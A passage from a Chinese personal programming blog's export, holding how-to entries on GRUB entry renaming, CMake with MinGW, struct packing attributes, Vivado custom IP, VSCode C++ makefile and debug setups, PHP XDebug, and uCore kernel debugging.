<h3 id="2-通过修改-boot-grub文件修改名字（简单粗暴）"><a href="#2-通过修改-boot-grub文件修改名字（简单粗暴）" class="headerlink" title="2. 通过修改/boot/grub文件修改名字（简单粗暴）"></a>2. 通过修改/boot/grub文件修改名字（简单粗暴）</h3><p><code>sudo gedit /boot/grub/grub.cfg</code><br>找到对应的选项名字编辑后保存即可，不需要<code>sudo update-grub</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_35379989/article/details/78934486">ubuntu安装后出现的问题（安装时分辨率不对/错误界面过大、nvdia显卡无法进入）</a><br><a href="https://blog.csdn.net/as371418912/article/details/23452259">Ubuntu和Windows启动项名称、顺序修改</a><br><a href="https://tianyijian.github.io/2018/04/05/ubuntu-grub-beautify/">Ubuntu grub 引导界面美化</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows安装Cmake</title>
    <url>/2019/11/05/use-cmake-in-windows/</url>
    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>已安装<code>MinGW64</code>，即具有<code>mingw32-make.exe</code>文件</p>
<h2 id="下载CMake"><a href="#下载CMake" class="headerlink" title="下载CMake"></a>下载CMake</h2><p><a href="https://cmake.org/download/">CMake下载页面</a><br>根据平台下载安装包<br>PS：下载<code>Binary distributions</code>，别下载成源码了</p>
<h2 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h2><p>创建输出文件夹，指定生成类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bulid</span><br><span class="line">cd bulid</span><br><span class="line">cmake -G &quot;MinGW Makefiles&quot; ../</span><br><span class="line">mingw32-make</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/JohnJim0/article/details/81842249">WINDOWS下CMake+MinGW64搭建C/C++编译环境</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>使用__attribute__配置结构体，禁用编译器自动对齐</title>
    <url>/2020/07/21/use-attribute-packed-to-disable-align/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>结构体声明中加上<code>__attribute__((packed))</code>，可以防止编译器对结构进行字节对齐优化。<br>使用<code>__attribute__((aligned(8)))</code>(8为对齐字节数)，可以强制编译器按指定字节对齐。</p>
<h2 id="结构体定义"><a href="#结构体定义" class="headerlink" title="结构体定义"></a>结构体定义</h2><h3 id="使用-packed"><a href="#使用-packed" class="headerlink" title="使用 packed"></a>使用 packed</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AlignTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> a;	 <span class="comment">//1</span></span><br><span class="line">	<span class="keyword">short</span> b; <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">int</span> c;	 <span class="comment">//4</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<p>使用sizeof获取结构体的大小，返回7</p>
<h3 id="不使用-packed"><a href="#不使用-packed" class="headerlink" title="不使用 packed"></a>不使用 packed</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AlignTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> a;	 <span class="comment">//1</span></span><br><span class="line">	<span class="keyword">short</span> b; <span class="comment">//2</span></span><br><span class="line">	<span class="keyword">int</span> c;	 <span class="comment">//4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>根据结构体中最长的类型(int)，进行对齐，获取到的结构体大小为8</p>
<h3 id="指定对齐大小"><a href="#指定对齐大小" class="headerlink" title="指定对齐大小"></a>指定对齐大小</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AlignTest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> a;	 <span class="comment">//1</span></span><br><span class="line">	<span class="keyword">short</span> b; <span class="comment">//2</span></span><br><span class="line">	<span class="keyword">int</span> c;	 <span class="comment">//4</span></span><br><span class="line">    <span class="keyword">int</span> d;	 <span class="comment">//4</span></span><br><span class="line">&#125; __attribute__((<span class="built_in">aligned</span>(<span class="number">8</span>)));</span><br></pre></td></tr></table></figure>
<p>不使用指定对齐字节时，结构体大小为3*4=12，指定后变为16</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/zuiyinian/article/details/81174031">为什么要用 “ <strong>attribute</strong> ((<strong>packed</strong>)) ” 定义结构体</a><br><a href="https://blog.csdn.net/swj9099/article/details/96713277"><strong>attribute</strong> 用法</a></p>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Vivado 自定义IP核并实例化调用</title>
    <url>/2019/10/07/vivado-custom-ip-and-instantiation/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>作业：将四选一数据选择器封装成IP，用以实现八选一数据选择器。</p>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="将项目封装成IP"><a href="#将项目封装成IP" class="headerlink" title="将项目封装成IP"></a>将项目封装成IP</h3><p>打开要封装的项目，然后点击工具栏<br><code>Tools</code>-<code>Create and Package New IP</code>-<code>Next</code><br>打包当前项目即可（选择完<code>Package your current project</code>后一路Next）<br>（当然，这里也可以手动选择路径进行打包）<br>然后会出现<code>Packaging Steps</code>窗口<br>如果不想修改配置的话，可以直接选择最后一步，<code>Review and Package</code>-<code>Package IP</code></p>
<h3 id="在其他项目中导入"><a href="#在其他项目中导入" class="headerlink" title="在其他项目中导入"></a>在其他项目中导入</h3><p>打开需要调用IP的项目，点击左侧<br><code>Flow Navigator</code>-<code>IP Catalog</code><br>在空白处右键，<code>Add Repository</code>，选择之前打包的文件夹<br>(如果之前打包的是项目的话，则对应<code>.srcs</code>文件夹，如<code>D:\source\Vivado\mux_8_1\mux_8_1.srcs</code>)<br>然后双击导入的IP，导入并生成<br>导入成功后，在<code>Sources</code>-<code>IP Sources</code>中可以看到IP<br>其中<code>Instantiation Template</code>即为实例化模板</p>
<h3 id="实例化调用"><a href="#实例化调用" class="headerlink" title="实例化调用"></a>实例化调用</h3><p>最简单的方法，把实例化代码复制出来，修改一下实例名称以及参数即可<br>如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">mux_4_1_0 <span class="title">m2</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  .d1(d5),    <span class="comment">// input wire [1 : 0] d1</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .d2(d6),    <span class="comment">// input wire [1 : 0] d2</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .d3(d7),    <span class="comment">// input wire [1 : 0] d3</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .d4(d8),    <span class="comment">// input wire [1 : 0] d4</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .s1(s1),    <span class="comment">// input wire s1</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .s0(s0),    <span class="comment">// input wire s0</span></span></span></span><br><span class="line"><span class="params"><span class="function">  .out(out2)  <span class="comment">// output wire [1 : 0] out</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>注意，实例化时，output只能是wire类型，不然语法错误</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/kenjianqi1647/article/details/79199054">vivado学习之自定义IP和调用自定义IP的步骤</a><br><a href="https://stackoverflow.com/questions/36687767/unknown-error-during-synthesis-of-axi-ips">Unknown Error during synthesis of AXI IPs</a></p>
]]></content>
      <tags>
        <tag>Vivado</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode配置C++多文件环境</title>
    <url>/2019/04/13/vscode-cpp-multiplefile/</url>
    <content><![CDATA[<h2 id="修正"><a href="#修正" class="headerlink" title="修正"></a>修正</h2><p>发现makefile存在问题，仅会编译比main.cpp更新的依赖文件，导致每次都要make两次才能正常调试。已修改<code>$?</code>为<code>$^</code></p>
<blockquote>
<p>$@ –代表目标文件(target)<br>$^  –代表所有的依赖文件(components)<br>$&lt;  –代表第一个依赖文件(components中最左边的那个)<br>$?  –代表比目标还要新的依赖文件列表</p>
</blockquote>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>之前从知乎抄的配置只能编译单文件源文件，编译多文件的话需要手动修改g++编译参数（不能忍啊→_→），于是搜索之，找到解决方案。<br>关键词：makefile</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>原本使用VSCode就可以正常进行编译调试等操作。<br>已安装make工具并添加到环境变量，我自己用的是<code>mingw32-make</code><br>（也可使用msys提供的工具包，度盘链接: <a href="https://pan.baidu.com/s/1zJBcS6tjfXlwg1kP6VnLSg">https://pan.baidu.com/s/1zJBcS6tjfXlwg1kP6VnLSg</a> 提取码: f9ya）</p>
<h2 id="具体方案"><a href="#具体方案" class="headerlink" title="具体方案"></a>具体方案</h2><h3 id="构建makefile模板"><a href="#构建makefile模板" class="headerlink" title="构建makefile模板"></a>构建makefile模板</h3><p>我基本是直接复制参考博文里的模板(修改标准库为17)，内容如下</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># originating https://github.com/TheNetAdmin/Makefile-Templates</span></span><br><span class="line"><span class="comment"># tool marcros</span></span><br><span class="line">CC := g++</span><br><span class="line">CCFLAG := -std=c++17</span><br><span class="line">DBGFLAG := -g</span><br><span class="line">CCOBJFLAG := <span class="variable">$(CCFLAG)</span> -c</span><br><span class="line"></span><br><span class="line"><span class="comment"># path marcros</span></span><br><span class="line">BIN_PATH := bin</span><br><span class="line">OBJ_PATH := obj</span><br><span class="line">SRC_PATH := src</span><br><span class="line">DBG_PATH := debug</span><br><span class="line"></span><br><span class="line"><span class="comment"># compile marcros</span></span><br><span class="line">TARGET_NAME := main</span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(OS)</span>,Windows_NT)</span><br><span class="line">	TARGET_NAME := <span class="variable">$(<span class="built_in">addsuffix</span> .exe,<span class="variable">$(TARGET_NAME)</span>)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line">TARGET := <span class="variable">$(BIN_PATH)</span>/<span class="variable">$(TARGET_NAME)</span></span><br><span class="line">TARGET_DEBUG := <span class="variable">$(DBG_PATH)</span>/<span class="variable">$(TARGET_NAME)</span></span><br><span class="line">MAIN_SRC := src/main.cpp</span><br><span class="line"></span><br><span class="line"><span class="comment"># src files &amp; obj files</span></span><br><span class="line">SRC := <span class="variable">$(<span class="built_in">foreach</span> x, <span class="variable">$(SRC_PATH)</span>, $(<span class="built_in">wildcard</span> $(<span class="built_in">addprefix</span> <span class="variable">$(x)</span>/*,.c*)</span>))</span><br><span class="line">OBJ := <span class="variable">$(<span class="built_in">addprefix</span> <span class="variable">$(OBJ_PATH)</span>/, $(<span class="built_in">addsuffix</span> .o, $(<span class="built_in">notdir</span> $(<span class="built_in">basename</span> <span class="variable">$(SRC)</span>)</span>)))</span><br><span class="line">OBJ_DEBUG := <span class="variable">$(<span class="built_in">addprefix</span> <span class="variable">$(DBG_PATH)</span>/, $(<span class="built_in">addsuffix</span> .o, $(<span class="built_in">notdir</span> $(<span class="built_in">basename</span> <span class="variable">$(SRC)</span>)</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># clean files list</span></span><br><span class="line">DISTCLEAN_LIST := <span class="variable">$(OBJ)</span> \</span><br><span class="line">                  <span class="variable">$(OBJ_DEBUG)</span></span><br><span class="line">CLEAN_LIST := <span class="variable">$(TARGET)</span> \</span><br><span class="line">			  <span class="variable">$(TARGET_DEBUG)</span> \</span><br><span class="line">			  <span class="variable">$(DISTCLEAN_LIST)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># default rule</span></span><br><span class="line"><span class="section">default: all</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># non-phony targets</span></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CCFLAG)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(OBJ_PATH)</span>/%.o: <span class="variable">$(SRC_PATH)</span>/%.c*</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CCOBJFLAG)</span> -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(DBG_PATH)</span>/%.o: <span class="variable">$(SRC_PATH)</span>/%.c*</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CCOBJFLAG)</span> <span class="variable">$(DBGFLAG)</span> -o <span class="variable">$@</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_DEBUG)</span>: <span class="variable">$(OBJ_DEBUG)</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CCFLAG)</span> <span class="variable">$(DBGFLAG)</span> <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># phony rules</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: all</span></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: debug</span></span><br><span class="line"><span class="section">debug: <span class="variable">$(TARGET_DEBUG)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	@echo CLEAN <span class="variable">$(CLEAN_LIST)</span></span><br><span class="line">	@rm -f <span class="variable">$(CLEAN_LIST)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: distclean</span></span><br><span class="line"><span class="section">distclean:</span></span><br><span class="line">	@echo CLEAN <span class="variable">$(CLEAN_LIST)</span></span><br><span class="line">	@rm -f <span class="variable">$(DISTCLEAN_LIST)</span></span><br></pre></td></tr></table></figure>

<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>src文件夹下放源文件以及头文件，后面还要需要修改<code>.vscode</code>中的<code>task.json</code>和<code>launch.json</code><br>注意：如果使用本文中的makefle，包含主函数的源文件名必须为<code>main.cpp</code><br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/VSCode-cpp-mf.png"></p>
<h3 id="task-json"><a href="#task-json" class="headerlink" title="task.json"></a>task.json</h3><p>如果你使用的是msys的工具包，那command就写make<br>按快捷键<code>Ctrl+Shift+B</code>可以执行仅生成命令（build）<br>（在微软输入法中文模式时会出现表情窗口←_←）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tasks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;mingw32-make&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;default&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;group&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;build&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;isDefault&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;build-debug&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;mingw32-make&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;debug&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;clean&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;mingw32-make&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;clean&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// https://github.com/Microsoft/vscode-cpptools/blob/master/launch.md</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;(gdb) Launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cppdbg&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/debug/main.exe&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;args&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/debug/&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;environment&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;externalConsole&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">&quot;internalConsoleOptions&quot;</span>: <span class="string">&quot;neverOpen&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;MIMode&quot;</span>: <span class="string">&quot;gdb&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;miDebuggerPath&quot;</span>: <span class="string">&quot;gdb.exe&quot;</span>, <span class="comment">// 调试器路径，Windows下后缀不能省略，Linux下则去掉</span></span><br><span class="line">            <span class="attr">&quot;setupCommands&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Enable pretty-printing for gdb&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;text&quot;</span>: <span class="string">&quot;-enable-pretty-printing&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;ignoreFailures&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;build-debug&quot;</span> <span class="comment">// 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置完成"><a href="#配置完成" class="headerlink" title="配置完成"></a>配置完成</h3><p>enjoy it!<br>😉</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/wzxlovesy/article/details/76708151">VS Code 配置 C/C++ 环境</a></p>
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>使用VSCode调试PHP代码（XDebug）</title>
    <url>/2021/12/05/vscode-debug-php/</url>
    <content><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>VSCode</code>：安装<code>PHP Debug</code>拓展<br><code>PHP 7.4.26</code>（<a href="https://sourceforge.net/projects/xampp/">XAMPP</a>）：<code>xampp-windows-x64-7.4.26-0-VC15-installer.exe</code></p>
<p><code>XDebug</code>：使用<code>D:\xampp\php\ext</code>自带的<code>2.8.1</code>版本的<code>php_xdebug.dll</code></p>
<span id="more"></span>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>增加以下内容：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[XDebug]</span></span><br><span class="line"><span class="attr">zend_extension</span>=php_xdebug.dll</span><br><span class="line"><span class="attr">xdebug.remote_enable</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_autostart</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">xdebug.remote_handler</span> = <span class="string">&quot;dbgp&quot;</span></span><br><span class="line"><span class="attr">xdebug.remote_port</span> = <span class="string">&quot;9003&quot;</span></span><br><span class="line"><span class="attr">xdebug.remote_host</span> = <span class="string">&quot;127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>
<p>重启<code>PHP</code>，打开<a href="http://localhost/dashboard/phpinfo.php">http://localhost/dashboard/phpinfo.php</a>查看是否启动成功（搜索<code>xdebug</code>）</p>
<h3 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h3><h4 id="setting-json"><a href="#setting-json" class="headerlink" title="setting.json"></a>setting.json</h4><p>打开网站根目录（如<code>D:\xampp\htdocs</code>），打开一个<code>php</code>文件（如<code>index.php</code>），然后使用<code>VSCode</code>打开<br>如果之前没配置过php路径，会提示配置<code>php.validate.executablePath</code><br>修改<code>setting.json</code>，增加路径配置：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;php.validate.executablePath&quot;</span>: <span class="string">&quot;D:\\xampp\\php\\php.exe&quot;</span>,</span><br><span class="line"><span class="string">&quot;php.debug.executablePath&quot;</span>: <span class="string">&quot;D:\\xampp\\php\\php.exe&quot;</span>,</span><br></pre></td></tr></table></figure>
<h4 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h4><p>增加<code>Listen for Xdebug</code>配置，端口与<code>php.ini</code>的配置保持一致<br>如：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Listen for Xdebug&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;php&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: <span class="number">9003</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>附加后下断点即可，可使用<code>curl</code>发送请求：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://localhost/index.php</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/phonecom/p/10340038.html#/c/subject/p/10340038.html">VSCode+Xdebug断点调试PHP（全攻略）</a></p>
]]></content>
      <tags>
        <tag>VSCode</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode设置输出exe文件的编码</title>
    <url>/2019/04/30/vscode-cpp-exe-encoding/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>中文字符串在编辑界面正常显示，编译生成的exe中文乱码。源文件编码为UTF-8，设置输出的可执行文件编码为GB2312后正常显示。<br>解决方案：添加编译参数<code>-fexec-charset=GB2312</code></p>
<h2 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h2><h3 id="1-tasks-json中直接使用g-的情况"><a href="#1-tasks-json中直接使用g-的情况" class="headerlink" title="1. tasks.json中直接使用g++的情况"></a>1. tasks.json中直接使用g++的情况</h3><p>具体方法：<br>在tasks[args]中添加<code>&quot;-fexec-charset=GB2312&quot;</code></p>
<h3 id="1-tasks-json中使用make的情况"><a href="#1-tasks-json中使用make的情况" class="headerlink" title="1. tasks.json中使用make的情况"></a>1. tasks.json中使用make的情况</h3><p>在makefile中添加<code>-fexec-charset=GB2312</code><br>比如<a href="https://blog.xhyeax.com/2019/04/13/vscode-cpp-multiplefile/">上一篇博文</a>中的makefile，则在<code>CCOBJFLAG</code>后添加该参数，变为</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CCOBJFLAG := <span class="variable">$(CCFLAG)</span> -c -fexec-charset=GB2312</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>C++</tag>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux下使用VSCode调试uCore内核代码</title>
    <url>/2020/10/15/vscode-debug-ucore/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>操作系统实验使用的是清华大学的uCore，而实验指导书使用的是命令行调试。由于内核是由C语言编写的，于是尝试使用VSCode调试内核代码。（调试boot还是得<code>make debug</code>）</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Ubuntu 18.04，已根据指导书配置环境，并安装了VSCode</p>
<h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><h3 id="安装拓展"><a href="#安装拓展" class="headerlink" title="安装拓展"></a>安装拓展</h3><p>安装<code>C/C++</code>拓展<br>PS：建议安装语言包，搜索<code>Chinese</code>即可找到</p>
<span id="more"></span>
<h3 id="修改Makefile"><a href="#修改Makefile" class="headerlink" title="修改Makefile"></a>修改Makefile</h3><p>打开<code>Makefile</code>，搜索<code>debug:</code>，添加</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">debug-nogdb: <span class="variable">$(UCOREIMG)</span></span></span><br><span class="line">	<span class="variable">$(V)</span><span class="variable">$(QEMU)</span> -S -s -parallel stdio -hda <span class="variable">$&lt;</span> -serial null</span><br></pre></td></tr></table></figure>
<p>PS：其实就是去掉了gdb自动附加的命令，因为要使用VSCode启动的gdb去附加</p>
<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><h4 id="launch-json"><a href="#launch-json" class="headerlink" title="launch.json"></a>launch.json</h4><p>使用VSCode打开LABX文件夹（如LAB1），然后按下F5，选择<code>C++(GDB/LLDB)</code>，将跳转到<code>launch.json</code>文件<br>然后将</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;program&quot;</span>: <span class="string">&quot;输入程序名称，例如 $&#123;workspaceFolder&#125;/a.out&quot;</span>,</span><br></pre></td></tr></table></figure>
<p>替换为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;miDebuggerServerAddress&quot;</span>: <span class="string">&quot;localhost:1234&quot;</span>,</span><br><span class="line"><span class="string">&quot;program&quot;</span>: <span class="string">&quot;$&#123;workspaceFolder&#125;/bin/kernel&quot;</span>,</span><br><span class="line"><span class="string">&quot;preLaunchTask&quot;</span>: <span class="string">&quot;build-debug-nogdb&quot;</span>,</span><br></pre></td></tr></table></figure>
<h4 id="tasks-json"><a href="#tasks-json" class="headerlink" title="tasks.json"></a>tasks.json</h4><p>在<code>.vscode</code>文件夹下创建<code>tasks.json</code>文件，填入以下内容：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tasks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;label&quot;</span>: <span class="string">&quot;build-debug-nogdb&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;make&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;args&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;debug-nogdb&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;isBackground&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;problemMatcher&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;pattern&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;regexp&quot;</span>: <span class="string">&quot;.&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;background&quot;</span>: &#123;</span><br><span class="line">          <span class="attr">&quot;activeOnStart&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">          <span 